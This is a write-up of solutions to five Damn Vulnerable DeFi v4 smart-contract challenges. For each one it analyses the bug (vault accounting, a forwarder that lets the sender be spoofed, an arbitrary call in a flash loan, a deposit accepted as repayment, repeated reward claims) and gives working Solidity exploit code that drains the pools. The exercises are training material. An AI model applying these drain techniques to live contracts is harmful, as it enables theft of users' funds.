# damn vulnerable defi solutuions

Here I solve Damn Vulnerable DeFi v4 challenges: https://www.damnvulnerabledefi.xyz/

In the explanations below, I assume that you are familiar with contracts.

[1. Unstoppable](#1-unstoppable)      
[2. Naive Receiver](#2-naive-receiver)  
[3. Truster](#3-truster)    
[4. Side Entrence](#4-side-enterance)   
[5. The Rewarder](#5-the-rewarder)  

## 1. Unstoppable

### Challenge Overview

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.
Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

### Contracts

UnstoppableVault.sol - main logic      
UnstoppableMonitor.sol - monitoring if vault is functional      
      
### Vulnerability Analysis

In the UnstoppableVault.sol contract, we have a flashLoan function, where the core functionality is implemented. If we break this function, the vault will stop giving loans.

There are 3 checkings before the function starts executing the loan

      if (amount == 0) revert InvalidAmount(0); // fail early
      if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
      uint256 balanceBefore = totalAssets();
      if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

This is the critical part. If we succeed in making the function always fail one of those checks, the vault will stop giving loans.
The only checking that is not dependent on function parameters is the third one. 

      if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

This check creates a strict requirement that the vault's accounting system always match the actual token balance. 

### Solution

By simply sending DVT tokens to the contract balance, we will successfully break the vault!

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }



## 2. Naive receiver

### Challenge Overview

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 
A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.
All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

### Contracts:

NaiveRecevierPool.sol - The main pool that enables flash loans  
FlashLoanReceiver.sol - The victim borrower contract that will be drained      
BasicForwarder.sol - Enables meta-transactions through an EIP-712 system      
Multicall.sol - Allows batching multiple function calls into one transaction

### Vulnerability Analysis

So, we need to drain 1010 WETH from the pool and borrower contract. In NaiveReceiver.sol, we have the flashLoan function, which implements the core loan functionality. It calls the borrower's onFlashLoan() function, and here, we have our first critical security problem.

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

The onFlashLoan() function only checks if the caller is the pool, but it doesn't check if the transaction initiator is the actual owner of the contract. This means that anyone can call the transaction on the owner's behalf, and here is the solution to the first part of our challenge. As the fee of the loan is 1 ETH, we can drain the borrower's balance by simply calling the loan function 10 times on the owner's behalf. Now, all 1010 ETH are on the contract's balance and belong to the pool deployer.
We also need to drain the pool's balance. If we look closer to withdraw function, we'll see that the function does not check if the receiver is the initiator of the withdrawal. 

    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }

So we can put our address as the receiver. But there is a problem here. We, as msg.sender, don't have any balance in the pool's accounting. If we look closer at how _msgSender() function retrieves the initiator's address, we'll find the second security problem!

    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }

Here, if _msgSender() got the request from trustedForwarder and it has msg.data appended to it, it will return the address appended to the request. So here, we can simply initiate a withdrawal request through Forwarder and append the deployer's address to it. The withdraw function will receive the deployer's address and will transfer all the funds to the specified receiver!

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        uint8 numberOfCalls = 11;

        // Create an array of encoded flashLoan calls
        bytes[] memory encodedCalls = new bytes[](numberOfCalls);

        for(uint8 i = 0; i < 10; i++) {
            // Encode the call to flashLoan
            encodedCalls[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver),
                address(weth),
                0,
                ""
            );
        }

        // Encode the call to withdraw
        encodedCalls[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), 
            bytes32(uint256(uint160(deployer)))
        );

        // Encode the multicall data
        bytes memory multicallData = abi.encodeCall(pool.multicall, encodedCalls);

        // Create the request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: multicallData,
            deadline: 1 days
        });

        // Hash the request
        bytes32 requestHash = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
            )
        );

        // Sign the request
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the transaction
        forwarder.execute(request, signature);
    }


## 3. Truster

### Challenge Overview 

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
The pool holds 1 million DVT tokens. You have nothing.
To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

### Contracts

TrusterLenderPool.sol

### Vulnerability Analysis

The pool's core functionality is implemented in flashLoan function. At the end of the function, it checks if the funds are fully refunded, so we need to find a way to get the DVT tokens after the function execution. 
If we look closer, we can see that contract lets us make arbitrary function call.

    target.functionCall(data);

This means, that we can call any function we want from flashLoan function. So if we make the pool contract to approve the DVT tokens for us, later we can transfer them to our recovery address. 

### Solution

    contract Drainer {
        constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {
            bytes memory data = abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                token.balanceOf(address(pool))
            );

            pool.flashLoan(0, address(this), address(token), data);

            token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
        }
    }

    /**
    * CODE YOUR SOLUTION HERE
    */
    function test_truster() public checkSolvedByPlayer {
        Drainer drainer = new Drainer(token, pool, recovery);
    }


## 4. Side enterance

### Challenge overview

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

### Vulnerability Analysis

In the flashLoan() function, we can see that we have an opportunity to call our implementation of the execute() function. 
The function checks if we refund the ETH to the contract, but it doesn't control the way we do that. 

The root issue is that the contract doesn't distinguish between "repayment of a loan" and "making a deposit" - they both increase the contract's ETH balance, but have very different accounting implications. 

Attack flow:
1. Call flashLoan() to borrow all ETH from the pool
2. In our execute() function, deposit the borrowed ETH back into the pool
3. The pool's balance is restored (passing the check), but now we have credit in the pool's accounting system
4. Call withdraw() to drain the pool of all funds

This attack allows us to drain all ETH from the pool without actually owning any legitimate stake in it.

### Solution

    contract MyIFlashLoanEtherReceiver {
        SideEntranceLenderPool pool;
        address payable recovery;
        
        constructor(address _pool, address payable _recovery) {
            recovery = _recovery;
            pool = SideEntranceLenderPool(_pool);
        }

        function callFlashLoan(uint256 amount) external {
            pool.flashLoan(amount);
        }

        function execute() external payable {
            pool.deposit{value: msg.value}();
        }

        function withdraw() public {
            pool.withdraw();
            (bool success, ) = recovery.call{value: address(this).balance}("");
        }

        receive() external payable {}

    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        MyIFlashLoanEtherReceiver loanReceiver = new MyIFlashLoanEtherReceiver(address(pool), payable(recovery));
        loanReceiver.callFlashLoan(ETHER_IN_POOL);
        loanReceiver.withdraw();
    }

## 5. The rewarder

### Challenge overview

A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

### Vulnerability Analysis

Only way to get he funds is the claimRewards() function, so let's focus on that. The function allows us to claim both DVT ans WETH rewards with one request. 
The first vulnerability we can notice is that the function marks our reward claimed in two cases:
    1. During the last iteration
    2. When token to claim changes

Also, there's no limit on how many claims we can process in a single transaction. This creates an exploit path where we can submit multiple identical claims (using the same valid Merkle proof since 'player' is a legitimate beneficiary) for the same token and batch. Since the contract only marks claims as claimed at token switches or at the end of processing, we can claim our reward multiple times and drain the contract.

Attack flow:
1. Read the distribution JSON files to find our legitimate claim amount for DVT and WETH tokens
2. Create an array of multiple claims for the same token and same batch (batch 0)
3. For each token:
   - Make the first claim with a valid Merkle proof (since our address is on the beneficiary list)
   - Make multiple subsequent claims with the same Merkle proof
   - The contract will verify the proof for each claim but only mark the batch as claimed after processing all claims
4. Execute the transaction to drain nearly all tokens from the distributor 
5. Transfer all recovered assets to the designated recovery account

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_theRewarder() public checkSolvedByPlayer {
        
        string memory dvtDistributuion = vm.readFile("test/the-rewarder/dvt-distribution.json");
        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtDistributuion), (Reward[]));

        string memory wethDistribution = vm.readFile("test/the-rewarder/weth-distribution.json");
        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethDistribution), (Reward[]));

        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
    
        uint256 dvtAmount;
        bytes32[] memory dvtProof;
        for (uint256 i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                dvtAmount = dvtRewards[i].amount;
                dvtProof = merkle.getProof(dvtLeaves, i);
                break;
            }
        }

        uint256 wethAmount;
        bytes32[] memory wethProof;
        for (uint256 i = 0; i < wethRewards.length; i++) {
            if (wethRewards[i].beneficiary == player) {
                wethAmount = wethRewards[i].amount;
                wethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }

        uint256 dvtClaimsNeeded = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtAmount;
        uint256 wethClaimsNeeded = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethAmount;
        uint256 totalClaimsNeeded = dvtClaimsNeeded + wethClaimsNeeded;

        Claim[] memory claims = new Claim[](totalClaimsNeeded);
        for(uint256 i = 0; i < totalClaimsNeeded; i++) {
            if (i < dvtClaimsNeeded) {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: dvtAmount,
                    tokenIndex: 0,
                    proof: dvtProof
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: wethAmount,
                    tokenIndex: 1,
                    proof: wethProof
                });
            }
        }

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(dvt));
        tokens[1] = IERC20(address(weth));

        distributor.claimRewards(claims, tokens);

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
